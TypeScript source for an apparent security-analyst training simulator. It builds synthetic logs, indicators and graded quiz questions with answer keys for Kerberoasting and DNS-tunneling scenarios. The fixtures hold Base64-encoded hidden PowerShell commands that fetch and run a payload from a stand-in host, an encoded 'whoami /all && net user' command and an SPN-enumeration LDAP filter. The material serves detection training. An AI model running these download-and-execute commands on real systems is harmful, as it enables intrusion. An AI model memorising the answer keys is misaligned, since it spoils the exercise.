        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1305",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

    // T+4min+40s: TGS for BACKUP service
    {
      id: "evt_kerb_05_tgs_backup", ts: T(4 * MIN + 40_000),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "TA0006",
      description: "A third RC4-encrypted TGS ticket was requested for BACKUP/srv-backup01 (svc-backup), the third in 40 seconds.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (BACKUP/srv-backup01) is named in the event description.
        "winlog.event_data.ServiceName": "svc-backup",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1310",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

    // T+8min: Volume spike — 12 TGS tickets in 90 seconds
    {
      id: "evt_kerb_06_ticket_spike", ts: T(8 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: dcIp, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1558.003", mitre_tactic: "TA0006",
      description: "Microsoft Sentinel correlated 12 RC4-encrypted TGS ticket requests from m.cohen across 12 distinct SPNs within 90 seconds.",
      raw: {
        "siem.rule_name": "Kerberoasting_Volume_Spike",
        "siem.rule_id": "KERB-SPIKE-001",
        "siem.correlated_events": 12,
        "siem.window_seconds": 90,
        "siem.source_user": "m.cohen",
        "siem.source_ip": attackerIp,
        "siem.dc_hostname": "DC01.nexacorp.com",
        "siem.unique_spns_targeted": ["MSSQLSvc/srv-db01:1433", "HTTP/intranet.corp", "BACKUP/srv-backup01", "MSSQL/srv-db02:1433", "svc-sharepoint/sharepoint.corp:443", "wsman/srv-mgmt01", "cifs/srv-file01", "termserv/srv-rdp01", "svc-sap/sap-prod01:3200", "exchange/mail.corp", "svc-jenkins/jenkins01:8080", "svc-gitlab/gitlab.corp"],
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "alert.type": "MassKerberoasting",
        "source.ip": attackerIp,
      },
    },

    // T+15min: Login from cracked service account svc-mssql (T1078)
    {
      id: "evt_kerb_07_svcacct_login", ts: T(15 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "srv-db01", src_ip: "10.10.30.44",
      severity: "critical", mitre_technique: "T1078", mitre_tactic: "TA0001",
      description: "The svc-mssql service account logged on interactively (Type 2) to srv-db01 from WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-db01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "52100",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": "srv-db01",
        "source.ip": attackerIp,
        "authentication.protocol": "NTLM",
        "file.hash.sha256": sqlHash,
      },
    },

    // T+18min: xp_cmdshell PowerShell execution via svc-mssql (T1059.001)
    {
      id: "evt_kerb_08_xp_cmdshell", ts: T(18 * MIN),
      source: "db_monitor", vendor: "IBM Guardium", event_type: "db_schema_change",
      hostname: "srv-db01", src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1059.001", mitre_tactic: "TA0002",
      description: "svc-mssql ran EXEC xp_cmdshell on srv-db01 to launch a hidden, Base64-encoded PowerShell command.",
      process: { name: "sqlservr.exe", pid: 2200, path: "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", cmdline: "xp_cmdshell 'powershell -enc SQBFAFgAIAAo...'", user: "svc-mssql", integrity: "high" },
      raw: {
        "db.vendor": "IBM Guardium",
        "db.type": "mssql",
        "db.instance": "srv-db01",
        "db.name": "master",
        "db.user": "svc-mssql",
        "db.statement": "EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'",
        "db.rows_affected": 0,
        "db.duration_ms": 1200,
        "db.operation": "EXEC",
        "db.object": "xp_cmdshell",
        "db.schema": "sys",
        "client.ip": attackerIp,
        "client.application": "osql.exe",
        "event.action": "xp-cmdshell-exec",
        "event.outcome": "success",
        "user.name": "svc-mssql",
        "host.name": "srv-db01",
      },
    },

    // ── CORRELATED: Baseline — m.cohen normal Kerberos ticket pattern ─────────────
    {
      id: "evt_kerb_baseline_tgs", ts: T(-60 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      description: "m.cohen requested 2 Kerberos TGS tickets in the prior 60 minutes, both AES256-encrypted.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "m.cohen",
        "winlog.event_data.TicketEncryptionType": "0x12",
        // Service ACCOUNT, not the SPN (cifs/dev-repo01) that was requested.
        "winlog.event_data.ServiceName": "SRV-REPO01$",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "AES256",
        "user.name": "m.cohen",
        "source.ip": attackerIp,
      },
    },

    // ── CORRELATED: LDAP BloodHound-style SPN query from attacker host ────────────
    {
      id: "evt_kerb_bloodhound_ldap", ts: T(1 * MIN),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "high",
      hostname: attackerHost, src_ip: attackerIp,
      mitre_technique: "T1087.002",
      description: "Microsoft Defender for Identity flagged the LDAP SPN wildcard query from WS-DEV-4412 as a BloodHound/PowerView reconnaissance pattern.",
      raw: {
        "event.action": "LdapSearch",
        "event.outcome": "success",
        "mdi.alert.type": "LdapSearchReconnaissanceUsingSamr",
        "mdi.alert.description": "LDAP query with servicePrincipalName wildcard filter — BloodHound/PowerView pattern",
        "mdi.source.computer": attackerHost,
        "mdi.source.user": "m.cohen",
        "ldap.filter": "(&(objectCategory=user)(servicePrincipalName=*))",
        "ldap.attributes_requested": "servicePrincipalName,sAMAccountName,pwdLastSet",
        "ldap.results_count": "8",
        "process.name": "powershell.exe",
        "user.name": "NEXACORP\\m.cohen",
        "host.name": attackerHost,
        "source.ip": attackerIp,
      },
    },

    // ── CORRELATED: svc-mssql lateral movement — SMB to file server ───────────────
    {
      id: "evt_kerb_svcacct_lateral", ts: T(16 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "critical",
      hostname: "srv-file01", src_ip: attackerIp,
      mitre_technique: "T1021.002",
      description: "The svc-mssql service account authenticated to srv-file01 via a network logon (Type 3).",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-file01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": "srv-file01",
        "source.ip": attackerIp,
        "authentication.protocol": "NTLM",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",   value: attackerIp,          reputation: "suspicious", tags: ["internal-attacker", "kerberoasting-source", "developer-workstation"] },
    { type: "user", value: "m.cohen@nexacorp.com", reputation: "suspicious", tags: ["compromised-user", "kerberoasting-actor"] },
    { type: "user", value: "svc-mssql",           reputation: "suspicious", tags: ["compromised-svc-account", "cracked-via-kerberoast"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Kerberoasting → Service Account Compromise → xp_cmdshell",
    threat_actor: "Internal Attacker (Compromised Developer Account)",
    attack_kind: "credential_theft_kerberoasting",
    briefing: "Microsoft Sentinel fired 'Anomalous Kerberos service ticket volume' for m.cohen on WS-DEV-4412 at 10:12, and Defender for Identity raised a separate reconnaissance alert on the same workstation. A related alert on srv-db01 is attached to the ticket.",
    narrative: `An attacker with a foothold on developer workstation WS-DEV-4412 used PowerView to enumerate all service principal names (SPNs) via LDAP. They then requested Kerberos TGS tickets for 12 service accounts in 90 seconds — all using weak RC4 encryption (0x17). These tickets were exfiltrated and cracked offline using hashcat. Fifteen minutes later, the cracked svc-mssql password was used to log in interactively to the database server. From there, xp_cmdshell was used to execute a PowerShell reverse shell.`,
    learning_objectives: [
      "Identify RC4 encryption (0x17) in Event ID 4769 as a Kerberoasting indicator",
      "Recognize abnormal TGS request volume from a single account in a short window",
      "Correlate LDAP SPN enumeration (4662) → TGS requests (4769) → cracked service account login (4624)",
      "Understand why service accounts logging on interactively is highly suspicious",
      "Detect xp_cmdshell as a post-exploitation code execution technique (T1059.001)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),             phase: "Initial Access",     action: "Attacker foothold on developer workstation WS-DEV-4412" },
      { ts: T(2 * MIN),       phase: "Reconnaissance",     action: "LDAP SPN enumeration via PowerView — 8 Kerberoastable accounts found" },
      { ts: T(4 * MIN),       phase: "Credential Access",  action: "Kerberos TGS tickets requested for SQL, IIS, Backup services (RC4/0x17)" },
      { ts: T(8 * MIN),       phase: "Credential Access",  action: "Volume spike: 12 TGS tickets in 90 seconds — bulk Kerberoasting" },
      { ts: T(15 * MIN),      phase: "Credential Use",     action: "svc-mssql password cracked — interactive login to srv-db01" },
      { ts: T(18 * MIN),      phase: "Execution",          action: "xp_cmdshell spawns encoded PowerShell — attacker achieves code execution on DB server" },
    ],
    questions: [
      {
        id: "kerb_q1_rc4",
        prompt: "Event evt_kerb_03_tgs_sql is a 4769 service-ticket request whose TicketEncryptionType is 0x17. Why does that single value turn a routine Kerberos event into a Kerberoasting indicator?",
        kind: "single",
        options: [
          { value: "rc4_offline_crack", label: "An RC4 ticket is encrypted with the service account's NTLM hash, so it cracks offline" },
          { value: "dc_fallback", label: "0x17 means the DC rejected the stronger cipher and issued a downgraded ticket instead" },
          { value: "preauth_disabled", label: "0x17 marks the target account as having Kerberos pre-authentication switched off" },
          { value: "tgt_only_value", label: "0x17 can only ever appear on a TGT request, never on a service-ticket request" },
        ],
        answer: "rc4_offline_crack",
        xp: 50,
        explanation:
          "0x17 is RC4-HMAC. The TGS is sealed with a key derived directly from the service account's NTLM hash, so anyone holding the ticket can brute-force the password offline with no further traffic to the DC — that is the whole point of Kerberoasting (T1558.003). 'dc_fallback' is wrong: the client, not the DC, proposes the encryption types, and RC4 here was requested, not forced. 'preauth_disabled' describes AS-REP roasting (T1558.004), which shows up as PreAuthType 0 on a 4768 TGT request, not as an encryption type on a 4769. 'tgt_only_value' inverts the facts — the record is event ID 4769, a TGS, and TicketEncryptionType appears on both 4768 and 4769.",
      },
      {
        id: "kerb_q2_volume",
        prompt: "Select the TWO observations that, taken together, separate this activity from normal Kerberos ticket traffic. You will need evt_kerb_02_ldap_spn and evt_kerb_06_ticket_spike.",
        kind: "multi",
        options: [
          { value: "spn_enum_first", label: "An LDAP servicePrincipalName wildcard query returned 8 accounts two minutes earlier" },
          { value: "twelve_in_90s", label: "Twelve service tickets for twelve distinct SPNs were issued inside a 90-second window" },
          { value: "logged_on_dc", label: "Every one of the ticket requests was recorded on DC01 rather than on the workstation" },
          { value: "ntlm_package", label: "The ticket requests name NTLM as the authentication package used against the domain" },
        ],
        answer: ["spn_enum_first", "twelve_in_90s"],
        xp: 75,
        explanation:
          "Kerberoasting has a shape: first find every account that has an SPN, then ask for a ticket for each one. The 4662 LDAP query supplies the target list and the 12 tickets in 90 seconds consume it — neither is odd alone, but together they are the technique. 'logged_on_dc' is a property of the log source, not the behaviour: 4769 is *always* written by the KDC on a domain controller, including for m.cohen's benign baseline ticket. 'ntlm_package' is simply false here — 4769 is a Kerberos event by definition and no NTLM package is recorded on it; the NTLM authentication in this scenario appears later, on the 4624s.",
      },
      {
        id: "kerb_q3_chain",
        prompt: "evt_kerb_07_svcacct_login shows svc-mssql logging on to srv-db01 with LogonType 2, sourced from WS-DEV-4412 and using the NTLM package. Read alongside evt_kerb_03_tgs_sql. What does the pair actually establish?",
        kind: "single",
        options: [
          { value: "cracked_and_reused", label: "The svc-mssql ticket was cracked offline and its recovered password used to log on" },
          { value: "ticket_replayed", label: "The captured TGS ticket was replayed straight to srv-db01 to open the interactive session" },
          { value: "service_restart", label: "The SQL Server service restarted on srv-db01 and re-authenticated its own account" },
          { value: "delegation_relay", label: "Unconstrained delegation on srv-db01 forwarded m.cohen's ticket on to the database host" },
        ],
        answer: "cracked_and_reused",
        xp: 100,
        explanation:
          "The link is the eleven-minute gap plus the authentication package. A TGS is Kerberos; this logon is NTLM, which means a password or its hash was typed in, not a ticket presented — so the ticket must have been cracked in between. 'ticket_replayed' fails on that same field: replaying a TGS produces a Kerberos logon, and a service ticket grants access to one service, not an interactive session. 'service_restart' fails on LogonType and origin — a service starting itself is LogonType 5 and originates on srv-db01, whereas this record carries the developer workstation's IP. 'delegation_relay' would impersonate m.cohen, the delegating user, and would still be Kerberos; the TargetUserName here is svc-mssql.",
      },
      {
        id: "kerb_q4_dbexec",
        prompt: "Select the TWO facts that make the srv-db01 activity a confirmed compromise rather than ordinary database administration.",
        kind: "multi",
        options: [
          { value: "svc_interactive", label: "A service account opened an interactive session from a developer's workstation" },
          { value: "xp_cmdshell_enc", label: "sqlservr.exe used xp_cmdshell to launch a hidden Base64-encoded PowerShell command" },
          { value: "master_database", label: "The Guardium record shows the statement was executed against the master database" },
          { value: "osql_client", label: "The client application on the Guardium record is osql.exe rather than a web app" },
        ],
        answer: ["svc_interactive", "xp_cmdshell_enc"],
        xp: 75,
        explanation:
          "Service accounts are meant to be used *by services* — non-interactive logon types from the servers they run on. A LogonType 2 for svc-mssql sourced from a workstation has no benign explanation, and xp_cmdshell spawning hidden encoded PowerShell is command execution on the DB host (T1059.001), not database work. 'master_database' is a red herring: xp_cmdshell is an extended stored procedure that lives in master, so every legitimate call to it is also against master. 'osql_client' is likewise neutral — osql.exe is a Microsoft-supplied SQL client that DBAs use daily; the tool does not make the statement malicious, the statement does.",
      },
    ],
  };
}

// =========================================================================
// Scenario 8: DNS Tunneling — C2 via DNS TXT Records + Exfiltration
// =========================================================================

export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): ScenarioBundle {
  const B = new Date("2026-05-20T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victimHost = "WS-ENG-3301";
  const victimEmail = "a.jones@nexacorp.com";
  const victimIp = "10.100.50.20";
  const c2Domain = "c2-nexus-update.xyz";
  const dnscat2Hash = makeSha256("dnscat2_client_2.4.0");
  // The PROCESS in evt_dns_01 is powershell.exe, a signed Microsoft binary; the
  // file it downloads is update.exe. Both previously carried dnscat2Hash, so one
  // SHA256 described two files and a student pivoting on the process hash would
  // have concluded powershell.exe was the implant. Same defect the neighbouring
  // LOLBins scenario has an explicit comment about having already fixed.
  const powershellBinaryHash = makeSha256("powershell_exe_system_binary");

  const events: TelemetryEvent[] = [
    // T+0: PowerShell downloads dnscat2 (T1059.001)
    {
      id: "evt_dns_01_download", ts: T(0),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "TA0002",
      description: "A hidden, Base64-encoded PowerShell command on WS-ENG-3301 downloaded update.exe (dnscat2) and saved it to C:\\Windows\\Temp\\.",
      process: {
        name: "powershell.exe", pid: 7744, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "cmd.exe", parent_pid: 7700,
        cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA1AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAiACwAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHUAcABkAGEAdABlAC4AZQB4AGUAIgApAA==",
        user: "a.jones", integrity: "medium",
        hash: { sha256: powershellBinaryHash },
      },
      file: { name: "update.exe", path: "C:\\Windows\\Temp\\update.exe", sha256: dnscat2Hash, size: 1048576 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessId": "7744",
        "ProcessCommandLine": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAo...",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": powershellBinaryHash,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessId": "7700",
        "InitiatingProcessAccountName": "a.jones",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "AccountName": "a.jones",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284471",
        "host.name": victimHost,
        "user.name": "NEXACORP\\a.jones",
      },
    },

    // T+3min: DNS tunneling begins — base32 encoded subdomains
    {
      id: "evt_dns_02_tunnel_begin", ts: T(3 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1071.004", mitre_tactic: "TA0011",
      description: `WS-ENG-3301 queried a 53-character base32-encoded subdomain of ${c2Domain} — the first tunnel query from update.exe.`,
      dns: { query: `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2.data.${c2Domain}`, query_type: "A", response: "192.168.100.5", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:03:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2.data.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": `type: 1 192.168.100.5`,
        "dns.question.subdomain_length": "53",
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // T+6min: DNS query volume spike — 847 queries to attacker domain in 60 seconds
    {
      id: "evt_dns_03_volume_spike", ts: T(6 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1071.004", mitre_tactic: "TA0011",
      description: `Microsoft Sentinel correlated 847 DNS queries from WS-ENG-3301 to *.${c2Domain} within 60 seconds.`,
      raw: {
        "siem.rule_name": "DNSTunneling_VolumeSpike",
        "siem.rule_id": "DNS-TUNNEL-001",
        "siem.correlated_events": 847,
        "siem.window_seconds": 60,
        "siem.source_host": victimHost,
        "siem.source_ip": victimIp,
        "siem.destination_domain": `*.${c2Domain}`,
        "siem.avg_subdomain_length": "52.3",
        "siem.max_subdomain_length": "63",
        "siem.baseline_query_rate": "23",
        "siem.deviation_factor": "36.8",
        "siem.query_types": ["A", "TXT"],
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "alert.type": "DNSTunneling",
        "source.ip": victimIp,
      },
    },

    // T+10min: C2 commands via DNS TXT records
    {
      id: "evt_dns_04_txt_c2", ts: T(10 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1071.004", mitre_tactic: "TA0011",
      description: `WS-ENG-3301 queried cmd.${c2Domain} for a TXT record; the response decodes to whoami /all && net user.`,
      dns: { query: `cmd.${c2Domain}`, query_type: "TXT", response: "d2hvYW1pIC9hbGwgJiYgbmV0IHVzZXI=", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:10:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `cmd.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": "type: 16 d2hvYW1pIC9hbGwgJiYgbmV0IHVzZXI=",
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // T+14min: Data begins exfiltrating via DNS subdomains (T1041)
    {
      id: "evt_dns_05_exfil_start", ts: T(14 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1041", mitre_tactic: "TA0010",
      description: `WS-ENG-3301 sent a DNS query whose base64-encoded subdomain decodes to admin@cryotech.com.`,
      dns: { query: `YWRtaW5AY3J5b3RlY2guY29t.data.${c2Domain}`, query_type: "A", response: "NXDOMAIN", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:14:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `YWRtaW5AY3J5b3RlY2guY29t.data.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": "",
        "dns.question.subdomain_length": "24",
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // T+18min: Large file chunked over DNS — hundreds of queries
    {
      id: "evt_dns_06_file_chunks", ts: T(18 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1041", mitre_tactic: "TA0010",
      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes.`,
      raw: {
        "siem.rule_name": "DNSTunneling_FileChunks",
        "siem.rule_id": "DNS-EXFIL-002",
        "siem.correlated_events": 247,
        "siem.window_seconds": 240,
        "siem.source_host": victimHost,
        "siem.source_ip": victimIp,
        "siem.destination_domain": `*.data.${c2Domain}`,
        "siem.chunk_pattern": `base32chunk_NNNN.data.${c2Domain}`,
        "siem.first_chunk": `base32chunk_0001.data.${c2Domain}`,
        "siem.last_chunk_seen": `base32chunk_0247.data.${c2Domain}`,
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "alert.type": "DNSTunnelingFileExfiltration",
        "source.ip": victimIp,
      },
    },

    // ── CORRELATED: Baseline — WS-ENG-3301 normal DNS query volume ────────────────
    {
      id: "evt_dns_baseline_volume", ts: T(-10 * MIN),
      source: "dns", vendor: "Windows DNS Server",
      event_type: "dns_query", severity: "informational",
      hostname: victimHost, src_ip: victimIp,
      description: "WS-ENG-3301 sent about 23 DNS queries per minute to developer tool domains (GitHub, npm, VS Code).",
      raw: {
        "event.action": "dns_baseline_aggregate",
        "host.name": victimHost,
        "source.ip": victimIp,
        "dns.top_domains": ["api.github.com", "registry.npmjs.org", "code.visualstudio.com"],
        "dns.avg_subdomain_length": "8",
        "dns.avg_entropy": "2.1",
        "dns.query_types": ["A", "AAAA"],
        "event.outcome": "success",
      },
    },

    // ── CORRELATED: EDR process event — dnscat2 (update.exe) making DNS queries ──
    {
      id: "evt_dns_process_queries", ts: T(3 * MIN + 30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint",
      event_type: "net_connection", severity: "high",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      mitre_technique: "T1071.004",
      description: "Defender for Endpoint identified update.exe (PID 4488) as the process generating the 847 queries/minute to the corporate DNS server.",
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceNetworkEvents",
        "event.action": "ConnectionSuccess",
        "DeviceName": victimHost,
        "ActionType": "ConnectionSuccess",
        "InitiatingProcessFileName": "update.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\Temp\\update.exe",
        "InitiatingProcessSHA256": dnscat2Hash,
        "InitiatingProcessId": "4488",
        "Protocol": "Udp",
        "RemotePort": "53",
        "RemoteIP": "10.10.1.1",
        "RemoteUrl": "corporate-dns.nexacorp.com",
        "host.name": victimHost,
        "user.name": "NEXACORP\\a.jones",
        "AccountName": "a.jones",
        "AccountDomain": "NEXACORP",
        "source.ip": victimIp,
      },
    },

    // ── CORRELATED: Firewall — c2Domain newly registered (3 days old) ─────────────
    {
      id: "evt_dns_fw_newdomain", ts: T(3 * MIN + 10_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "medium",
      src_ip: victimIp, dst_port: 53,
      hostname: victimHost,
      description: `The firewall logged DNS traffic (port 53) from WS-ENG-3301 toward ${c2Domain}, a domain registered 3 days ago.`,
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.port": "53",
        "pan.app": "dns",
        "pan.action": "allow",
        "pan.rule": "ALLOW-DNS",
        "url.domain": c2Domain,
        "url.category": "Unknown/Uncategorized",
        "threat.category": "PossibleDNSTunnel",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain,                       reputation: "malicious", tags: ["c2-domain", "dns-tunnel", "dnscat2", "newly-registered"] },
    { type: "sha256", value: dnscat2Hash,                    reputation: "malicious", tags: ["dnscat2-client", "dns-tunnel-implant"] },
    { type: "ip",     value: victimIp,                       reputation: "suspicious", tags: ["infected-host", "dns-tunnel-source"] },
    { type: "domain", value: `data.${c2Domain}`,             reputation: "malicious", tags: ["c2-exfil-subdomain", "dns-chunked-exfil"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "DNS Tunneling — C2 Channel & Data Exfiltration",
    threat_actor: "APT-TUNNELRAT (Nation-State Affiliate)",
    attack_kind: "c2_dns_tunneling",
    briefing: "Microsoft Sentinel fired a DNS query-volume anomaly on WS-ENG-3301 at 14:12 — the host is far above its own baseline. Defender for Endpoint has attached a process name to the traffic, and the firewall logged port 53 traffic to an unfamiliar domain.",
